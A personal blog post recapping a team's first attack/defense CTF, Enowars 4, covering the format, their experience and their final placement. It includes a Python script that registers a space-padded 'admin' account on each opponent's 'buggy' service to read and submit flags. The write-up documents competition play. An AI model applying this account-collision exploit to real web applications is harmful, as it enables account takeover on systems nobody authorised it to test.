---
title: Enowars 4 CTF
author: Lim Kai Xian (AxiaMil)
date: 2020-07-19 00:00:00 +0800
categories: [CTF, Enowars-4]
tags: [ctf, tech, web]
toc: true
comments: true
---


# What is Enowars Capture The Flag Competition

Enowars Capture The Flag competiton is by a CTF-Team & Workgroup for Computer Security located in TU Berlin. It is a 2 man Attack / Defense CTF played online where teams will have to attack and defend their vulnerable Machine by firstly identifying vulnerabilities in the machine. Teams will be awarded points base on the time their service is up and submitting flags to the server. After identifying the vulnerabilities, teams will need to patch their service in order for them to gain points as their service is up while preventing other teams from exploiting their services and getting the flag. Points are deducted when other teams get flag from your vulnerable machine.

![upload-image](/assets/img/blog/enowars-4-CTF/cover.png)

The enowars server will check if your service is up and put in flags every round which is about every 2 minutes or so. Therefore every 2 minutes there will be new flags for each team.


# Our Experience

As this was my first time trying out an actual Attack / Defense CTF we spent some time finding out how it works. To add on, the timezone for the CTF was from 8pm to 5am hence we were not able to finish solving all the Challenges. Luckily, ColdSpot found a vulnerability on the service buggy and got the flag for it.

From there, we were able to write a script using python to get the flag automatically and submit to the flag collecter (enowars' server). This is our python script to solve the buggy challenge, It is in nowhere perfect as it took in other values other than the flag but submitting wrong flags wont penalize us so we did not really care much (It wasted time though).

```py
import requests
import re
import socket
import string
import signal
from contextlib import contextmanager

@contextmanager
def timeout(time):
    # Register a function to raise a TimeoutError on the signal.
    signal.signal(signal.SIGALRM, raise_timeout)
    # Schedule the signal to be sent after ``time``.
    signal.alarm(time)

    try:
        yield
    except TimeoutError:
        pass
    finally:
        # Unregister the signal so it won't be triggered
        # if the timeout is not reached.
        signal.signal(signal.SIGALRM, signal.SIG_IGN)


def raise_timeout(signum, frame):
    raise TimeoutError

def is_ascii(s):
    return all(ord(c) < 128 for c in s)

def get_flags():
    f = open("flag.txt", "r")
    known_flags = f.read().split('\n')
    ip_blacklist = [16,22,24,25,26,28,37,58,75,110,113,115,126,130,133,156,182,187,194]
    for i in range(1,198):
        if i in ip_blacklist:
            continue
        with timeout(10):
            try: 
                url = 'http://10.0.0.' + str(i) + ':7890/register'
                print(url)
                user_pass = {'username':'admin                                   ','pw':'lol'}
                s = requests.Session()
                s.post(url, data=user_pass)
                admin_url = 'http://10.0.0.' + str(i) + ':7890/user/admin'
                x = s.get(admin_url)
                result = re.findall("Status: (.*)</h3>", x.text)
                for u in result:
                    if string.printable not in u and u not in known_flags:
                        if u.strip() != '' and not is_ascii(u):
                            a.append(u)
            except:
                continue
    print('done')
while True:
    a = []

    get_flags()

    f_write = open("flag.txt", "a+")

    HOST = '10.0.13.37'
    PORT = 1337
    print(len(a))
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        while True:
            for i in a:
                s.sendall((i+'\n').encode('utf-8'))
                print(i+'\n')
                print(s.recv(1024))
                f_write.write(i + '\n')
            break
```

The enowars server will check if your service is up and put in flags every round which is about every 2 minutes or so. Therefore every 2 minutes there will be new flags for each team.

[Check their website here](https://enowars.com/)

# Placement

Before, we went to sleep we were placed at the 40th position and were also the 3rd for Singapore.

![upload-image](/assets/img/blog/enowars-4-CTF/score.png)

Waking up, we were suprised we have passed the team above us and have gotten the 39th position as the script was running overnight for us LOL.

# Overall

Overall, even though we did not place high for the competition it was a good introduction to Attack / Defense CTF in general. I'm sure we will be able to perfom much better in the next Attack / Defense CTF we attend

# Resources & Challenges

[Challenges/Vulnerable Services](https://github.com/enowars/enowars4-vulnbox-services)  
[Scoreboard used (Bambi Scoreboard)](https://github.com/enowars/bambi-scoreboard)  
[Infrastructure used (Bambi CTF Infrastructure)](https://github.com/enowars/bambictf)  